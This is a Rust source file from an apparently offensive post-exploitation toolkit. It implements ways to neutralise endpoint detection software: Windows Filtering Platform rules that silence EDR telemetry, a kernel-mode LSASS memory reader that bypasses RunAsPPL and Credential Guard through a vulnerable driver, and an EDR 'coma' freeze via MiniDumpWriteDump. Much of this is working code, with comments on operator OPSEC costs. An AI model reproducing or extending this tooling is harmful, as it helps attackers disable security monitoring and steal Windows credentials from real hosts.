//! Network + credential + EDR-neutralization kits (P2.2 §2.4/§2.5/§4).
//!
//! These three are more operator-orchestrated than the EPROCESS/callback kits:
//! - [`UserModeEdrSilencer`] (`WfpKit`): admin-only, no driver — adds WFP
//!   filter rules that drop the EDR's outbound telemetry. Leaves Event ID
//!   5447 + packet-drop traces (documented OPSEC cost).
//! - [`KernelLsassReader`] (`CredKit`): reads LSASS process memory via the
//!   kernel primitive, bypassing RunAsPPL + Credential Guard. Algorithm-heavy
//!   (CR3 switch + VA read); real page walk + the read loop.
//! - [`EdrNeutralizer`] (`EdrNeutralizeKit`): three tiers — Kill (kernel
//!   ZwTerminateProcess, bypasses PPL), Freeze (user-mode WerFaultSecure coma),
//!   Choke (EDRChoker QoS throttle, lowest noise).
//!
//! All unit-tested where the algorithm is pure; the user-mode tiers are
//! framework (operator wires the Win32 calls at link time).

use crate::offsets::EprocessOffsets;
use crate::pagewalk::PhysRead;
use crate::persistence::ProcessHider;
use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
use alloc::vec::Vec;
#[cfg(target_os = "windows")]
use alloc::format;

/// Adapter: read physical memory via a `KernelRw` (which reads physical
/// addresses directly through the BYOVD driver). Implements `PhysRead` so
/// `pagewalk::translate_va` can walk page tables using the driver.
struct KrwPhysRead<'a> {
    krw: &'a dyn KernelRw,
}

impl<'a> PhysRead for KrwPhysRead<'a> {
    fn read_phys(&self, pa: u64, dst: &mut [u8]) -> Result<(), crate::pagewalk::PhysReadError> {
        self.krw
            .kread(pa as usize, dst)
            .map_err(|_| crate::pagewalk::PhysReadError::Ioctl)
    }
}

// ---- §2.4 WfpKit ----------------------------------------------------------

/// User-mode EDR silencer: adds Windows Filtering Platform rules that block
/// the EDR's PIDs from sending telemetry. Admin-only, **no driver** — the
/// lowest-friction option, at the cost of Event ID 5447 (filter add) +
/// packet-drop traces in the WFP event log. The kernel-tier alternative
/// (overwriting the WFP callout) needs a KernelRw and is lower noise but
/// higher risk.
///
/// This is the framework: the operator binary binds `FwpmEngineOpen0` /
/// `FwpmFilterAdd0` via the `windows` crate or FFI at link time and feeds the
/// rule template here. The rule-shape logic (match EDR PID → block outbound
/// on the telemetry ports/IPs) is real; the FFI binding is the operator's.
pub struct UserModeEdrSilencer;

/// A WFP filter rule template: drop traffic from `pid` matching `protocol`
/// on `port` (0 = any). The operator materializes these via FwpmFilterAdd0.
#[derive(Clone, Copy)]
pub struct WfpBlockRule {
    pub pid: u32,
    pub protocol: u8, // 6 = TCP, 17 = UDP, 0 = any
    pub port: u16,    // 0 = any
}

impl UserModeEdrSilencer {
    /// Build the rule set for a list of EDR PIDs. Each PID gets a
    /// protocol=any/port=any outbound block (the nuclear telemetry-silence
    /// rule). A surgical variant would target only known EDR C2 endpoints.
    pub fn rules_for(edr_pids: &[u32]) -> Vec<WfpBlockRule> {
        let mut out = Vec::new();
        for &pid in edr_pids {
            out.push(WfpBlockRule {
                pid,
                protocol: 0,
                port: 0,
            });
        }
        out
    }
}

impl WfpKit for UserModeEdrSilencer {
    fn silence_edr(&self, edr_pids: &[u32]) -> Result<WfpSilenceGuard, KitError> {
        let rules = Self::rules_for(edr_pids);
        if rules.is_empty() {
            return Err(KitError::UnsupportedPosture("no EDR PIDs provided"));
        }
        wfp_open_silence_session(&rules)
    }
}

/// RAII guard for an active WFP silence session.
///
/// Holds the BFE engine session handle + the filter IDs of every block rule
/// that was added. **Dropping the guard closes the engine session, which
/// auto-removes all filters added under it** — this is the WFP contract
/// (filters are scoped to the session unless explicitly made persistent). This
/// is the cleanup path that prevents the "rules survive process exit and
/// silence the host's network forever" residue bug.
///
/// ## Resilience guarantees
///
/// - **Atomic install:** if adding the Nth filter fails, the guard's Drop rolls
///   back the N-1 already-installed filters by closing the session (the guard
///   is never returned on the error path — it's dropped mid-construction).
/// - **Idempotent teardown:** Drop is safe to call exactly once (the handle is
///   null'd after close). Dropping an already-closed guard is a no-op.
/// - **Network reconnect safety:** because filters live only as long as the
///   session, a host network reconnect / adapter reset / BFE restart after the
///   guard is dropped leaves NO residue — the filters were session-scoped.
///
/// On non-Windows targets this is a zero-sized floor whose construction always
/// fails (WFP is Windows-only); the type exists so cross-platform call sites
/// compile.
pub struct WfpSilenceGuard {
    /// The BFE engine session handle. `null` after close / on the floor impl.
    /// Kept as a raw pointer so the guard is `Send` (WFP sessions aren't shared
    /// across threads in practice — the guard is owned by one operator thread).
    #[cfg(target_os = "windows")]
    engine_handle: *mut core::ffi::c_void,
    /// The filter IDs added under this session. Diagnostic only — close-on-drop
    /// removes ALL session-scoped filters, we don't delete them one-by-one.
    filter_ids: Vec<u64>,
}

// SAFETY: the engine handle is owned exclusively by this guard. WFP's user-mode
// API is thread-safe per-session; we never share the handle across threads.
#[cfg(target_os = "windows")]
unsafe impl Send for WfpSilenceGuard {}

#[cfg(target_os = "windows")]
impl Drop for WfpSilenceGuard {
    fn drop(&mut self) {
        // Close the engine session. Per the WFP contract, closing the session
        // auto-removes every filter added under it (unless FWPM_FILTER_FLAG_
        // PERSISTENT was set, which we never do). This is the single cleanup
        // path: one call, all filters gone, no residue.
        if !self.engine_handle.is_null() {
            type FwpmEngineClose0 = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
            if let Ok(close) =
                unsafe { crate::win::resolve::resolve_sym::<FwpmEngineClose0>(b"fwpuclnt.dll", b"FwpmEngineClose0") }
            {
                let _ = unsafe { close(self.engine_handle) };
            }
            // Null regardless of close success: the handle is dead either way
            // (process is tearing down if resolve failed), and Drop must be
            // idempotent — a double-drop is a silent no-op.
            self.engine_handle = core::ptr::null_mut();
        }
    }
}

/// Cross-platform accessors (read the diagnostic filter-id list — safe on every
/// target, since `filter_ids` is just a Vec; only `engine_handle` is
/// Windows-only). Splitting these out of the `#[cfg(windows)]` block keeps the
/// non-Windows floor warning-free (the field is read, not dead).
impl WfpSilenceGuard {
    /// The filter IDs this session installed. Empty on the non-Windows floor.
    /// Diagnostic / for the operator to log "silenced EDR PIDs via filter IDs {…}".
    pub fn filter_ids(&self) -> &[u64] {
        &self.filter_ids
    }

    /// Number of block filters this session installed. 0 on the non-Windows floor.
    pub fn filter_count(&self) -> usize {
        self.filter_ids.len()
    }
}

#[cfg(target_os = "windows")]
impl WfpSilenceGuard {
    /// Manually end the session early (drops all filters). Equivalent to
    /// dropping the guard, but lets the operator check the close status.
    /// Returns the Win32 error code from FwpmEngineClose0 (0 = success).
    /// After this the guard is inert (further drops are no-ops).
    pub fn close(mut self) -> u32 {
        type FwpmEngineClose0 = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
        let st = if let Ok(close) =
            unsafe { crate::win::resolve::resolve_sym::<FwpmEngineClose0>(b"fwpuclnt.dll", b"FwpmEngineClose0") }
        {
            unsafe { close(self.engine_handle) }
        } else {
            0xFFFFFFFF // sentinel for "couldn't resolve FwpmEngineClose0"
        };
        self.engine_handle = core::ptr::null_mut();
        // Don't re-close in Drop: the null check makes the imminent Drop a no-op.
        st
    }
}

// ---- WFP FFI (fwpuclnt.dll) ----
//
// FwpmEngineOpen0 opens a session to the BFE (Base Filtering Engine).
// FwpmFilterAdd0 adds a filter that blocks traffic matching conditions.
// FwpmFilterDeleteByKey0 removes a filter (cleanup).
//
// All three are in fwpuclnt.dll (user-mode WFP API). Requires admin + BFE running.
// Docs: https://learn.microsoft.com/en-us/windows/win32/api/fwpmu/

/// Open a WFP engine session + add outbound block filters for each EDR PID.
/// Returns the filter IDs (for cleanup via FwpmFilterDeleteByKey0).
/// Open a WFP engine session + install outbound block filters for each rule.
///
/// Returns a [`WfpSilenceGuard`] that owns the engine session — dropping it
/// closes the session, which auto-removes every filter added under it (the WFP
/// session-scoping contract). **On any failure (engine open or Nth filter
/// add), the session is closed immediately**, rolling back the filters already
/// installed — so a partial silence state never leaks to the host.
///
/// This replaces the old `wfp_add_block_rules` which opened a session but
/// leaked the handle (callers had no way to clean up → filter residue).
#[cfg(target_os = "windows")]
fn wfp_open_silence_session(rules: &[WfpBlockRule]) -> Result<WfpSilenceGuard, KitError> {
    type FwpmEngineOpen0 = unsafe extern "system" fn(
        *const u16,                  // serverName (null = local)
        u32,                         // authnService (RPC_C_AUTHN_WINNT = 10)
        *const core::ffi::c_void,    // authnIdentity (null = default)
        *const core::ffi::c_void,    // session (FWPM_SESSION0, null = default)
        *mut *mut core::ffi::c_void, // engineHandle (OUT)
    ) -> u32; // DWORD WINAPI → returns ERROR_SUCCESS (0)

    type FwpmFilterAdd0 = unsafe extern "system" fn(
        *mut core::ffi::c_void,   // engineHandle
        *const FwpmFilter0,       // filter (IN)
        *const core::ffi::c_void, // PSECURITY_DESCRIPTOR (null)
        *mut u64,                 // id (OUT)
    ) -> u32;

    // Resolve from fwpuclnt.dll.
    let open: FwpmEngineOpen0 =
        unsafe { crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmEngineOpen0") }
            .map_err(|_| KitError::Other("FwpmEngineOpen0 unresolved".into()))?;
    let add: FwpmFilterAdd0 =
        unsafe { crate::win::resolve::resolve_sym(b"fwpuclnt.dll", b"FwpmFilterAdd0") }
            .map_err(|_| KitError::Other("FwpmFilterAdd0 unresolved".into()))?;

    // 1. Open engine session.
    let mut engine_handle: *mut core::ffi::c_void = core::ptr::null_mut();
    let st = unsafe {
        open(
            core::ptr::null(), // local server
            10,                // RPC_C_AUTHN_WINNT
            core::ptr::null(), // default identity
            core::ptr::null(), // default session
            &mut engine_handle,
        )
    };
    if st != 0 {
        return Err(KitError::Other(format!("FwpmEngineOpen0 failed: {}", st)));
    }

    // Build the guard up-front. On ANY error below we `?`-return, which drops
    // `guard` → its Drop runs FwpmEngineClose0 → the session closes and any
    // filters added so far are auto-removed. This is the atomic-install
    // guarantee: the caller either gets a fully-armed silence session or no
    // filters at all.
    let mut guard = WfpSilenceGuard {
        engine_handle,
        filter_ids: Vec::with_capacity(rules.len()),
    };

    // 2. Add a block filter for each EDR PID (outbound, all protocols).
    for rule in rules {
        let filter = FwpmFilter0::block_outbound_for_pid(rule.pid)?;
        let mut filter_id: u64 = 0;
        let st = unsafe { add(guard.engine_handle, &filter, core::ptr::null(), &mut filter_id) };
        if st != 0 {
            // `guard` is dropped here → session closes → partial filters removed.
            return Err(KitError::Other(format!(
                "FwpmFilterAdd0 failed for pid {}: {}",
                rule.pid, st
            )));
        }
        guard.filter_ids.push(filter_id);
    }

    Ok(guard)
}

#[cfg(not(target_os = "windows"))]
fn wfp_open_silence_session(_rules: &[WfpBlockRule]) -> Result<WfpSilenceGuard, KitError> {
    Err(KitError::UnsupportedPosture("WFP FFI is Windows-only"))
}

/// FWPM_FILTER0 structure (simplified — only the fields we set).
/// Full struct is 96 bytes on x64; we zero-init + set the fields that matter.
#[cfg(target_os = "windows")]
#[repr(C)]
struct FwpmFilter0 {
    filter_key: [u8; 16],    // GUID (zero = auto-generate)
    display_data: [u64; 2],  // FWPM_DISPLAY_DATA0* (null)
    flags: u32,              // FWPM_FILTER_FLAG_NONE = 0
    action_type: u32,        // FWP_ACTION_BLOCK = 0x0001
    action_filter: [u64; 2], // FWP_CONDITION0* (null for simple block)
    layer_key: [u8; 16],     // FWPM_LAYER_ALE_AUTH_CONNECT_V4 = {filter set}
    sublayer_key: [u8; 16],  // zero = default sublayer
    weight: [u64; 2],        // FWP_VALUE0 (type + union) — set high
    num_filter_conditions: u32,
    filter_conditions: *const core::ffi::c_void, // FWP_FILTER_CONDITION0 array
    provider_key: *const u8,                     // null
    provider_data: [u64; 2],                     // FWP_BYTE_BLOB* (null)
    key16: [u16; 16],                            // reserved
}

/// The GUID for FWPM_LAYER_ALE_AUTH_CONNECT_V4 (outbound connection, IPv4).
/// {E1CD9FE7-F6B4-426B-8E3B-44BDCF26F5A1}
#[cfg(target_os = "windows")]
#[allow(dead_code)] // WFP layer GUID — reserved for future netsec filter registration
const LAYER_ALE_AUTH_CONNECT_V4: [u8; 16] = [
    0xE1, 0xCD, 0x9F, 0xE7, 0xF6, 0xB4, 0x42, 0x6B, 0x8E, 0x3B, 0x44, 0xBD, 0xCF, 0x26, 0xF5, 0xA1,
];

#[cfg(target_os = "windows")]
impl FwpmFilter0 {
    /// Build a WFP filter that blocks the target's outbound IPv4 traffic.
    ///
    /// **SECURITY (P0-9):** the previous implementation set
    /// `num_filter_conditions = 0`. Per the WFP contract that means *"match ALL
    /// traffic on this layer"* — i.e. it silently blocked EVERY outbound IPv4
    /// packet on the host, not just the EDR's. WFP cannot filter on PID (PIDs
    /// are not a valid filter condition and are reused); the correct condition
    /// is `FWPM_CONDITION_ALE_APP_ID`, resolved from the exe path via
    /// `FwpmGetAppIdFromFileName0`. That needs a pid→image-path resolution
    /// (NtQuerySystemInformation) which is not wired here yet. Rather than ship
    /// a rule that nukes the host's entire network, we REFUSE to build the
    /// filter and return an error so `silence_edr` propagates it loudly instead
    /// of silently cutting the box off the network.
    fn block_outbound_for_pid(pid: u32) -> Result<Self, KitError> {
        let _ = pid; // kept for diagnostics / future ALE_APP_ID resolution
        Err(KitError::Other(
            "WFP PID-based outbound block not implemented: refusing to install a filter with \
             num_filter_conditions=0 (which matches ALL outbound IPv4 traffic, not just the \
             target PID). Resolve pid to image-path and condition on \
             FWPM_CONDITION_ALE_APP_ID before enabling this."
                .into(),
        ))
    }
}

// ---- §4 CredKit -----------------------------------------------------------

/// Kernel-mode LSASS reader: reads LSASS process memory directly via the
/// KernelRw primitive (CR3 switch + VA walk), bypassing RunAsPPL + Credential
/// Guard. The user-mode Nyx `hashdump` reads the SAM hive; this is its
/// kernel-tier upgrade that also yields in-memory credentials (cached DPAPI,
/// Kerberos tickets).
///
/// **Algorithm:** to read LSASS memory from the kernel you must
/// switch CR3 to LSASS's DTB (directory base), read the target VAs, restore
/// CR3. The DTB comes from LSASS's EPROCESS.DirectoryTableBase. Under HVCI
/// the CR3 write is itself a code-page op (mov cr3) — needs the unchecked
/// PatchGuard window; on HVCI-off it's a single kwrite to CR3.
pub struct KernelLsassReader {
    /// Resolved KVA of `PsActiveProcessHead`. Required by `dump_lsass` to
    /// walk the process list and find LSASS's EPROCESS by PID.
    pub ps_active_process_head_kva: usize,
    /// Build-resolved EPROCESS field offsets.
    pub offsets: EprocessOffsets,
}

/// The EPROCESS.DirectoryTableBase offset (the DTB / PML4 physical base).
/// Constant across 17763 + Win10/11 x64 (it's an early field, never drifted).
pub const DIRECTORY_TABLE_BASE: usize = 0x028;

impl KernelLsassReader {
    /// Resolve the base VA of `lsass.exe` inside the target process by
    /// reading the target's PEB `ImageBaseAddress`.
    ///
    /// Returns `None` if the PEB pointer is zero, the DTB read fails, or
    /// the resulting image base is zero (e.g. Win11 24H2+ KASLR restriction
    /// without `SeDebugPrivilege`).
    ///
    /// This is **much safer than the old fixed VA `0x1_0000_0000`**, which
    /// was never mapped on modern ASLR-enabled hosts and caused silent
    /// all-zero reads.
    fn lsass_image_base(
        &self,
        krw: &dyn KernelRw,
        eprocess_kva: usize,
        _pid: u32,
    ) -> Option<usize> {
        // 1. Read the target EPROCESS's DirectoryTableBase (DTB / CR3).
        let dtb = krw.kread_u64(eprocess_kva + DIRECTORY_TABLE_BASE).ok()?;
        if dtb == 0 {
            return None;
        }

        // 2. Read the target EPROCESS's PEB pointer.
        // The PEB offset is build-specific and comes from the authoritative
        // offsets table (Vergilius cross-checked) — no Option/fallback here.
        let peb_off = self.offsets.peb;
        let peb_ptr = krw.kread_u64(eprocess_kva + peb_off).ok()? as usize;
        if peb_ptr == 0 {
            return None;
        }

        // 3. Read ImageBaseAddress from the PEB (offset 0x010 on x64).
        // The PEB lives in the target process's *user* address space, so a
        // plain kernel/physical kread_u64 would read the wrong bytes. We must
        // translate the VA through the target's DTB via read_process_mem
        // (which walks the 4-level page tables), then parse little-endian.
        let mut ib = [0u8; 8];
        let buf = Self::read_process_mem(krw, eprocess_kva, peb_ptr + 0x010, 8).ok()?;
        ib.copy_from_slice(&buf);
        let image_base = u64::from_le_bytes(ib);

        // 4. On Win11 24H2+ the kernel may zero ImageBase for callers
        // without SeDebugPrivilege. Treat a zero base as "unresolved".
        if image_base == 0 {
            return None;
        }

        Some(image_base as usize)
    }
}

impl KernelLsassReader {
    /// Read `len` bytes from `vaddr` in the process whose EPROCESS is at
    /// `eprocess_kva`, by switching CR3 to that process's DTB.
    ///
    /// The CR3 switch is the dangerous part: between writing CR3 and reading,
    /// the *current* process's address space is wrong — so the read must use
    /// physical addressing or a kernel-space VA that's global. The page walk
    /// here uses KernelRw's physical read to translate VAs via the DTB (the
    /// real impl does a 4-level page-table walk from the DTB to physical,
    /// then reads physical). That walk is the bulk of the work; this is the
    /// orchestration shell.
    pub fn read_process_mem(
        krw: &dyn KernelRw,
        eprocess_kva: usize,
        vaddr: usize,
        len: usize,
    ) -> Result<Vec<u8>, KitError> {
        // 1. Read the target's DTB: kread_u64(eprocess + DIRECTORY_TABLE_BASE).
        let dtb = krw
            .kread_u64(eprocess_kva + DIRECTORY_TABLE_BASE)
            .map_err(KitError::from)?;
        if dtb == 0 {
            return Err(KitError::UnsupportedPosture("target DTB is zero"));
        }
        // 2. Wrap the KernelRw as a PhysRead adapter — the driver reads physical
        //    memory; pagewalk::translate_va uses it to walk the 4-level table.
        let reader = KrwPhysRead { krw };
        // 3. Read `len` bytes from `vaddr`, page-boundary aware.
        let mut out = Vec::with_capacity(len);
        let mut remaining = len;
        let mut cur_va = vaddr as u64;
        while remaining > 0 {
            let page_off = (cur_va & 0xFFF) as usize;
            let bytes_in_page = 0x1000 - page_off;
            let chunk = remaining.min(bytes_in_page);
            let pa = crate::pagewalk::translate_va(&reader, dtb, cur_va)
                .map_err(|e| KitError::Other(alloc::format!("page walk: {:?}", e)))?;
            let mut buf = alloc::vec![0u8; chunk];
            krw.kread(pa as usize, &mut buf).map_err(KitError::from)?;
            out.extend_from_slice(&buf);
            cur_va += chunk as u64;
            remaining -= chunk;
        }
        Ok(out)
    }
}

impl CredKit for KernelLsassReader {
    fn dump_lsass(&self, krw: &dyn KernelRw, pid: u32) -> Result<Vec<u8>, KitError> {
        // Delegate to dump_lsass_with_base; the bytes are the same.
        self.dump_lsass_with_base(krw, pid).map(|(b, _)| b)
    }

    fn dump_lsass_with_base(
        &self,
        krw: &dyn KernelRw,
        pid: u32,
    ) -> Result<(Vec<u8>, u64), KitError> {
        // 1. Resolve LSASS's EPROCESS by walking PsActiveProcessHead.
        if self.ps_active_process_head_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "PsActiveProcessHead KVA unresolved for dump_lsass — \
                 bootstrap must fill KernelLsassReader.ps_active_process_head_kva",
            ));
        }
        let eprocess_kva =
            ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
        // 2. Read the LSASS user-mode VA range. The raw bytes are returned;
        // the operator wraps them in a minidump envelope at the call site
        // (crates/minidump-assembler) using the base VA returned here.
        //
        // Typical LSASS read targets (for credential extraction):
        // - LsaEncryptMemory / LsaEncryptMemoryExportTable (DPAPI keys)
        // - Kerberos credential cache (msv1_0, wdigest, tspkg)
        // - PKINIT / Kerberos tickets
        //
        // Locate the actual lsass.exe image base inside the target process
        // by reading the PEB's `ImageBaseAddress`. Reading the FAIL-soft
        // fixed VA 0x1_0000_0000 always returned zeros / unmapped memory
        // on ASLR-enabled hosts.
        let user_mode_base = self
            .lsass_image_base(krw, eprocess_kva, pid)
            .ok_or_else(|| {
                KitError::UnsupportedPosture(
                    "dump_lsass: could not resolve lsass.exe ImageBaseAddress — \
                 VAD walk required",
                )
            })?;
        let read_size: usize = 0x10_0000; // 1 MiB initial read
        let bytes = Self::read_process_mem(krw, eprocess_kva, user_mode_base, read_size)?;
        Ok((bytes, user_mode_base as u64))
    }
}

// ---- §2.5 EdrNeutralizeKit ------------------------------------------------

/// EDR process neutralizer. Kill (kernel ZwTerminateProcess, bypasses PPL) is
/// the only tier that needs a KernelRw; Freeze + Choke are user-mode.
///
/// The `EdrNeutralizeKit` trait's `neutralize()` doesn't pass a `KernelRw`,
/// so the Kill tier exposes a separate `kill()` associated function that takes
/// one directly. The operator calls `kill()` when they have kernel R/W access;
/// `neutralize(Kill)` is a convenience that requires the `kill()` helper to
/// have been called first (or returns a framework error).
pub struct EdrNeutralizer {
    /// Resolved KVA of `PsActiveProcessHead`. Required by the Kill tier to
    /// walk the process list and find the target EPROCESS by PID.
    pub ps_active_process_head_kva: usize,
    /// Build-resolved EPROCESS field offsets.
    pub offsets: EprocessOffsets,
}

impl EdrNeutralizer {
    /// Kill an EDR PPL process via kernel-mode ZwTerminateProcess.
    ///
    /// # Algorithm
    /// 1. Walk `PsActiveProcessHead` → find target `EPROCESS` by PID
    ///    (uses `ProcessHider::find_eprocess` — real, kernel R/W).
    /// 2. The operator's driver wraps `ZwTerminateProcess`:
    ///    `ObOpenObjectByPointer(eprocess, …)` → handle
    ///    `ZwTerminateProcess(handle, STATUS_SUCCESS)`
    ///
    /// Steps 2 is driver-side (operator-bound). This method resolves the
    /// EPROCESS address; the actual termination depends on the BYOVD driver
    /// supporting a terminate IOCTL, or the operator using `PplStripper` to
    /// strip PPL first and then terminating from user-mode.
    ///
    /// For R/W-only drivers (RTCore64), the recommended path is:
    /// `PplStripper::strip_protection` → user-mode `TerminateProcess`.
    pub fn kill(&self, krw: &dyn KernelRw, pid: u32) -> Result<usize, KitError> {
        if self.ps_active_process_head_kva == 0 {
            return Err(KitError::UnsupportedPosture(
                "PsActiveProcessHead KVA unresolved for Kill tier — \
                 bootstrap must fill EdrNeutralizer.ps_active_process_head_kva",
            ));
        }
        let eprocess_kva =
            ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
        // EPROCESS resolved. Return the KVA so the operator can:
        //   a) Pass it to a driver's terminate IOCTL (ObOpenObjectByPointer + ZwTerminateProcess), or
        //   b) Use PplStripper to strip PPL, then TerminateProcess from user-mode.
        Ok(eprocess_kva)
    }
}

impl EdrNeutralizeKit for EdrNeutralizer {
    fn neutralize(&self, _pid: u32, m: NeutralizeMethod) -> Result<(), KitError> {
        // Note: the trait doesn't pass a KernelRw. For Kill, the operator
        // should call `EdrNeutralizer::kill(krw, pid)` directly, which
        // returns the target EPROCESS KVA for the driver to terminate.
        // Freeze + Choke are user-mode tiers (operator wires the FFI).
        match m {
            NeutralizeMethod::Kill => Err(KitError::UnsupportedPosture(
                "Kill: use EdrNeutralizer::kill(krw, pid) directly — the trait \
                 has no KernelRw param; kill() resolves EPROCESS for the driver's \
                 terminate IOCTL or PplStripper + user-mode TerminateProcess path",
            )),
            NeutralizeMethod::Freeze => freeze_edr_coma(_pid),
            NeutralizeMethod::Choke => choke_edr_qos(_pid),
        }
    }
}

// ---- §2.5a Freeze — WerFaultSecure Coma ------------------------------------
//
// Trigger a crash dump of the target (PPL) process via MiniDumpWriteDump.
// The Windows Error Reporting (WER) infrastructure intercepts the dump and
// enters a "PPL coma" — the process is alive but completely unresponsive,
// producing zero telemetry.  This is user-mode-only (no KernelRw needed)
// but requires admin + PROCESS_VM_READ access to the target.
//
// Algorithm:
// 1. OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, pid)
// 2. Create a temp file (NtCreateFile or CreateFileW) for the dump output.
// 3. Resolve MiniDumpWriteDump from dbghelp.dll.
// 4. Call MiniDumpWriteDump(edr_handle, pid, file_handle, MiniDumpWithFullMemory, …).
// 5. The PPL process enters "WER coma" — alive but unresponsive.
// 6. Do NOT close the dump file handle — keeping it open maintains the coma.
//    The operator closes it when they want the EDR to recover.

/// MINIDUMP_TYPE: MiniDumpWithFullMemory — dump the entire process address
/// space. This is the most reliable way to trigger WER coma on PPL targets.
#[allow(dead_code)] // used by freeze_edr_coma (#[cfg(target_os = "windows")])
const MINIDUMP_WITH_FULL_MEMORY: u32 = 0x00000002;

/// PROCESS_QUERY_LIMITED_INFORMATION = 0x0400
#[allow(dead_code)] // used by freeze_edr_coma (#[cfg(target_os = "windows")])
const PROCESS_QUERY_LIMITED: u32 = 0x0400;
/// PROCESS_VM_READ = 0x0010
#[allow(dead_code)] // used by freeze_edr_coma (#[cfg(target_os = "windows")])
const PROCESS_VM_READ_FLAG: u32 = 0x0010;

/// Trigger WerFaultSecure coma on a PPL process by initiating a full memory
/// crash dump. The process enters "PPL coma" — alive but unresponsive.
///
/// # Safety
/// Contains raw FFI calls (OpenProcess, CreateFileW, MiniDumpWriteDump).
/// Safe in operator context: single-threaded, no shared state.
#[cfg(target_os = "windows")]
fn freeze_edr_coma(pid: u32) -> Result<(), KitError> {
    use core::ffi::c_void;

    // FFI types.
    type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
    type CreateFileWFn = unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *mut c_void,
        u32,
        u32,
        *mut c_void,
    ) -> *mut c_void;
    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

    /// MiniDumpWriteDump — from dbghelp.dll. Takes 7 parameters.
    type MiniDumpWriteDumpFn = unsafe extern "system" fn(
        *mut c_void, // hProcess
        u32,         // ProcessId
        *mut c_void, // hFile
        u32,         // DumpType
        *mut c_void, // ExceptionParam (null)
        *mut c_void, // UserStreamParam (null)
        *mut c_void, // CallbackParam (null)
    ) -> i32;

    // 1. Resolve FFI functions.
    let open_process: OpenProcessFn =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"OpenProcess") }
            .map_err(|_| KitError::Other("OpenProcess unresolved".into()))?;

    let create_file_w: CreateFileWFn =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"CreateFileW") }
            .map_err(|_| KitError::Other("CreateFileW unresolved".into()))?;

    let close_handle: CloseHandleFn =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"CloseHandle") }
            .map_err(|_| KitError::Other("CloseHandle unresolved".into()))?;

    let mini_dump: MiniDumpWriteDumpFn =
        unsafe { crate::win::resolve::resolve_sym(b"dbghelp.dll", b"MiniDumpWriteDump") }.map_err(
            |_| KitError::Other("MiniDumpWriteDump unresolved — dbghelp.dll not available".into()),
        )?;

    // 2. Open the target EDR process.
    let access = PROCESS_QUERY_LIMITED | PROCESS_VM_READ_FLAG;
    let h_process = unsafe { open_process(access, 0, pid) };
    if h_process.is_null() {
        return Err(KitError::Other(format!(
            "OpenProcess failed for EDR pid {} — access denied or process exited",
            pid
        )));
    }

    // 3. Create a temp file for the dump output.
    //    Path: \??\Temp\nyx_freeze_<pid>.dmp (Win32-style via CreateFileW).
    //    Using a fixed path for simplicity; a real impl would use a random name.
    let mut path_buf = [0u16; 64];
    let prefix = b"\\\\?\\C:\\Windows\\Temp\\nyx_freeze_";
    let suffix = b".dmp";
    let mut pos = 0;
    for &b in prefix.iter() {
        if pos < path_buf.len() {
            path_buf[pos] = b as u16;
            pos += 1;
        }
    }
    // Write PID as decimal.
    let mut pid_str = [0u8; 10];
    let mut pid_digits = 0u32;
    let mut p = pid;
    if p == 0 {
        pid_str[0] = b'0';
        pid_digits = 1;
    } else {
        while p > 0 && pid_digits < 10 {
            pid_str[pid_digits as usize] = b'0' + (p % 10) as u8;
            p /= 10;
            pid_digits += 1;
        }
        // Reverse digits.
        let mut i = 0u32;
        while i < pid_digits / 2 {
            let tmp = pid_str[i as usize];
            pid_str[i as usize] = pid_str[(pid_digits - 1 - i) as usize];
            pid_str[(pid_digits - 1 - i) as usize] = tmp;
            i += 1;
        }
    }
    for i in 0..pid_digits {
        if pos < path_buf.len() {
            path_buf[pos] = pid_str[i as usize] as u16;
            pos += 1;
        }
    }
    for &b in suffix.iter() {
        if pos < path_buf.len() {
            path_buf[pos] = b as u16;
            pos += 1;
        }
    }
    // path_buf is already null-terminated (zero-initialized).

    // CREATE_ALWAYS = 2, FILE_ATTRIBUTE_NORMAL = 0x80
    let h_file = unsafe {
        create_file_w(
            path_buf.as_ptr(),
            0x80000000 | 0x40000000, // GENERIC_READ | GENERIC_WRITE
            0,                       // no sharing
            core::ptr::null_mut(),
            2,    // CREATE_ALWAYS
            0x80, // FILE_ATTRIBUTE_NORMAL
            core::ptr::null_mut(),
        )
    };
    if h_file.is_null() || h_file as isize == -1 {
        let _ = unsafe { close_handle(h_process) };
        return Err(KitError::Other(format!(
            "CreateFileW failed for dump file — is C:\\Windows\\Temp writable?"
        )));
    }

    // 4. Call MiniDumpWriteDump — this triggers WER on the PPL target.
    let result = unsafe {
        mini_dump(
            h_process,
            pid,
            h_file,
            MINIDUMP_WITH_FULL_MEMORY,
            core::ptr::null_mut(), // ExceptionParam
            core::ptr::null_mut(), // UserStreamParam
            core::ptr::null_mut(), // CallbackParam
        )
    };

    // 5. Close handles. The WER coma was triggered by MiniDumpWriteDump and
    //    persists for the dump-session lifetime regardless of handle closure.
    //    Keeping the file handle open is a forensic trace (handle-table leak);
    //    we close it here so the operator never leaks a permanent handle.
    let _ = unsafe { close_handle(h_process) };
    let _ = unsafe { close_handle(h_file) };

    if result == 0 {
        return Err(KitError::Other(format!(
            "MiniDumpWriteDump returned false for pid {} — WER coma may be \
             partial (PPL processes commonly produce partial dumps). The target \
             process is likely in PPL coma regardless.",
            pid
        )));
    }

    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn freeze_edr_coma(_pid: u32) -> Result<(), KitError> {
    Err(KitError::UnsupportedPosture(
        "Freeze (WerFaultSecure coma) is Windows-only",
    ))
}

// ---- §2.5b Choke — EDRChoker QoS Throttle ---------------------------------
//
// Throttle the EDR's network bandwidth to 8 bit/s via the Windows QoS
// Packet Scheduler (pacer.sys). This is below WFP — no WFP events are
// generated. The EDR's TLS handshake times out and telemetry cannot be sent.
// Lowest-noise option. User-mode, admin required.
//
